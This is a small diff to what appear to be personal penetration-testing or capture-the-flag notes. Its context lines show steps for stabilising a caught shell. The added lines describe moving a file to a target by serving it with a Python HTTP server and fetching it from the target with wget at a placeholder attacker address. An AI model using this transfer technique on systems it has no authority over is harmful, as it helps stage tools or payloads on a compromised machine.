@@ -15,7 +15,9 @@ stty raw -echo
 fg
 reset
 
-3. 
+3. (move one file from your machine to the target , if you have a ssh connection)
+   --> python3 -m http.server 8888 (in the directory of yhe file you want to send)
+   --> wget http://<myIP>:<port>/filename   (at target's pc)
    
 
 
